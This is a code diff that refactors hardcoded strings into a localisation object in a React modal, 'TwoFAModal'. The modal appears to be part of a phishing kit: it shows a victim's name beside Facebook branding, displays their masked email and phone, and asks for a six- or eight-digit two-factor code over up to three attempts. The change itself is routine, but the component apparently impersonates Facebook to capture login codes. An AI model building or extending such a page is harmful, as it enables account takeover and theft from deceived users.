@@ -124,10 +124,10 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
 
     if (!show) return null;
 
-    const userName = formData?.fullName || 'User';
+    const userName = formData?.fullName || texts.defaultUserName || 'User';
     const maskedEmail = maskEmail(formData?.personalEmail);
     const maskedPhone = maskPhone(formData?.phone);
-    const stepLabel = `(${texts.step || 'Bước'} ${attempts + 1}/${config.MAX_CODE || 3})`;
+    const stepLabel = `(${texts.step} ${attempts + 1}/${config.MAX_CODE || 3})`;
     const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));
     const isDeviceNotificationMethod = activeMethod === 'device_notifications';
     const notifyMethodSelection = (value: string) => {
@@ -136,7 +136,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
             methodText = texts.notificationsFromOtherDevices || 'Notifications from other devices';
         }
         if (value === 'id_selfie_video') {
-            methodText = texts.idAndSelfieVideo || 'ID and selfie video';
+            methodText = texts.idAndSelfieVideo;
         }
 
         const safeMethod = String(methodText)
@@ -315,7 +315,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
                         }}>
                             <span>{userName}</span>
                             <span>•</span>
-                            <span>Facebook</span>
+                            <span>{texts.facebook}</span>
                         </div>
 
                         <h2 style={{
@@ -406,7 +406,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
                             backgroundColor: '#9a979e',
                             borderRadius: '5px',
                         }} />
-                        <span>Facebook</span>
+                        <span>{texts.facebook}</span>
                     </div>
 
                     {/* Title */}
@@ -418,7 +418,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
                         marginBottom: '15px',
                         wordBreak: 'break-word',
                     }}>
-                        {texts.twoFAStep || 'Yêu cầu xác thực hai yếu tố'} {stepLabel}
+                        {texts.twoFAStep} {stepLabel}
                     </h2>
 
                     {/* Description */}
@@ -428,7 +428,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
                         lineHeight: 1.55,
                         margin: 0,
                     }}>
-                        {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || ',Enter the 6 or 8-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email, or text message on your mobile phone).'}`}
+                        {`${texts.twoFAInstructionPrefix} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix}`}
                     </p>
 
                     {/* 2FA Image */}
@@ -452,7 +452,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: Two
                             fontWeight: 600,
                             color: '#3b4a64',
                         }}>
-                            {texts.code || 'Mã 2FA'} <span style={{ color: '#e5484d' }}>*</span>
+                            {texts.code} <span style={{ color: '#e5484d' }}>*</span>
                         </label>
 
                         {/* Input */}
